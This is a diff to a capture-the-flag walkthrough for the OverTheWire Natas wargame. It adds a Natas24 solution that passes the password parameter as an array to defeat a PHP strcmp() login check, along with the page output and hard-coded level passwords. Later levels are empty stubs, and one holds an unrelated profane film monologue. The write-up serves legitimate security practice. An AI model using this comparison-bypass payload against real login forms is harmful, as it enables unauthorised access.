@@ -1303,6 +1303,113 @@ https://overthewire.org/wargames/natas/natas24.html
 > URL:      http://natas24.natas.labs.overthewire.org
 
 ```python
+import natasX
+
+natas = natasX
+
+print(natas.natasX(24, "OsRmXFguozKpTZZ5X14zNO43379LZveg", endpoint="index.php?passwd=").text)
+print(natas.natasX(24, "OsRmXFguozKpTZZ5X14zNO43379LZveg", endpoint="index.php?passwd[]").text)
+```
+
+**Output**
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas24", "pass": "OsRmXFguozKpTZZ5X14zNO43379LZveg" };</script></head>
+<body>
+<h1>natas24</h1>
+<div id="content">
+
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+<br />
+<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
+<br>The credentials for the next level are:<br><pre>Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c</pre>  
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+## Natas25
+https://overthewire.org/wargames/natas/natas25.html
+
+> Natas Level 24 → Level 25
+
+> Username: natas25
+
+> URL:      http://natas25.natas.labs.overthewire.org
+
+```python
+```
+
+**Output**
+
+#Quote
+```
+You see, no one's going to help you Bubby, because there isn't anybody out 
+there to do it. No one. We're all just complicated arrangements of atoms 
+and subatomic particles - we don't live. But our atoms do move about in 
+such a way as to give us identity and consciousness. We don't die; our atoms
+just rearrange themselves. There is no God. There can be no God; it's 
+ridiculous to think in terms of a superior being. An inferior being, maybe,
+because we, we who don't even exist, we arrange our lives with more order
+and harmony than God ever arranged the earth. We measure; we plot; we create
+wonderful new things. We are the architects of our own existence. What a 
+lunatic concept to bow down before a God who slaughters millions of innocent
+children, slowly and agonizingly starves them to death, beats them, tortures
+them, rejects them. What folly to even think that we should not insult such
+a God, damn him, think him out of existence. It is our duty to think God out
+of existence. It is our duty to insult him. Fuck you, God! Strike me down if
+you dare, you tyrant, you non-existent fraud! It is the duty of all human 
+beings to think God out of existence. Then we have a future. Because then
+- and only then - do we take full responsibility for who we are. And that's
+what you must do, Bubby: think God out of existence; take responsibility 
+for who you are.
+```
+
+```html
+```
+
+## Natas26
+https://overthewire.org/wargames/natas/natas26.html
+
+> Natas Level 25 → Level 26
+
+> Username: natas26
+
+> URL:      http://natas26.natas.labs.overthewire.org
+
+```python
+```
+
+**Output**
+
+```html
+```
+
+## Natas27
+https://overthewire.org/wargames/natas/natas27.html
+
+> Natas Level 26 → Level 27
+
+> Username: natas27
+
+> URL:      http://natas27.natas.labs.overthewire.org
+
+```python
 ```
 
 **Output**
